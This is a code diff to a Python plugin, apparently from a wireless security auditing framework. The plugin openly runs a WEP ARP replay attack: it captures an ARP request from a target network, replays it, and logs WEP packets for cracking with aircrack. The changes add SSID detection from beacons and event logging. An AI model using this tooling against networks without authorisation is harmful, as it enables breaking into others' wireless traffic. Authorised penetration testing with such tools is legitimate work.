@@ -1,11 +1,15 @@
 # -*- coding: utf-8 -*-
 """
-This plugin will launch a full arp replay attack on a WEP network
+This plugin will launch a full arp replay attack on a WEP network.
+
 You can then check the wep data log and launch aircrack on it.
 """
+from AuxiliaryModules.events import SuccessfulEvent, UnsuccessfulEvent
 from AuxiliaryModules.tcpdumplogger import TCPDumpLogger
+from AuxiliaryModules.packet import Beacon
+from SessionManager.sessionmanager import SessionManager
 from plugin import AirScannerPlugin
-from scapy.all import sniff, Dot11, Dot11WEP, conf, rdpcap
+from scapy.all import Dot11, Dot11Beacon, Dot11WEP, conf
 from time import strftime
 from threading import Thread, Lock
 
@@ -35,7 +39,7 @@ class ARPReplayer(AirScannerPlugin):
 
     def pre_scanning(self):
         timestr = strftime("%Y|%m|%d-%H|%M|%S")
-        self.filename = "wep_{m}_{t}.pcap".format(m = self.target_bssid, t = timestr)
+        self.filename = "wep_{s}_{m}_{t}.pcap".format(s = self.target_ssid, m = self.target_bssid, t = timestr)
         filter_str = "wlan type data and (wlan addr1 {t} or wlan addr2 {t})".format(t=self.target_bssid)
 
         self.tcpdump_logger = TCPDumpLogger(self.sniffing_interface,
@@ -43,6 +47,10 @@ class ARPReplayer(AirScannerPlugin):
                                             filter_str)
 
     def handle_packet(self, packet):
+        if Dot11Beacon in packet:
+            if packet[Dot11].addr1 == self.target_bssid:
+                self.target_ssid = Beacon(packet).ssid
+
         # Identify WEP packet
         if Dot11WEP in packet:
             # Check for ARP packet if not found before
@@ -58,6 +66,9 @@ class ARPReplayer(AirScannerPlugin):
                     self.replay_thread.start()
                     print "[+] Found a ARP request packet, trying replay attack."
                     self.tcpdump_logger.start_logging()
+                    SessionManager().log_event(SuccessfulEvent(
+                                              "Identified ARP request from client '{}'."
+                                              .format(packet[Dot11].addr2)))
 
             # Log WEP Data packets...
             if  "iv" in packet[Dot11WEP].fields.keys():
@@ -77,6 +88,9 @@ class ARPReplayer(AirScannerPlugin):
                     self.injection_working = False
                     self.n_arp_packets_sent = 0
                     print "[-] ARP replay was not working. Looking for new ARP packet."
+                    SessionManager().log_event(UnsuccessfulEvent(
+                                              "ARP replay attack not working for packet from client '{}'."
+                                              .format(self.arp_packet[Dot11].addr2)))
                     self.replay_thread.join()
 
     def arp_replay(self):
